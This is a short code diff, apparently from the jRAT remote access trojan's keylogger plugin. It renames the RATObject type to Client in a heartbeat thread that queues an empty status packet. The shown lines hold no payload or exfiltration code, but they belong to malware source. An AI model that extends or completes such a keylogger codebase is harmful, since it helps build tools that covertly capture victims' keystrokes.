@@ -4,14 +4,14 @@ import java.io.DataInputStream;
 import java.io.DataOutputStream;
 
 import jrat.api.PacketBuilder;
-import jrat.api.RATObject;
+import jrat.api.Client;
 
 public class HeartbeatThread implements Runnable {
 
 	private boolean enabled;
-	private RATObject server;
+	private Client server;
 
-	public HeartbeatThread(RATObject server) {
+	public HeartbeatThread(Client server) {
 		this.server = server;
 		this.enabled = true;
 	}
@@ -33,7 +33,7 @@ public class HeartbeatThread implements Runnable {
 
 				server.addToSendQueue(new PacketBuilder(KeyloggerPlugin.STATUS_HEADER, server) {
 					@Override
-					public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
+					public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
 
 					}
 				});
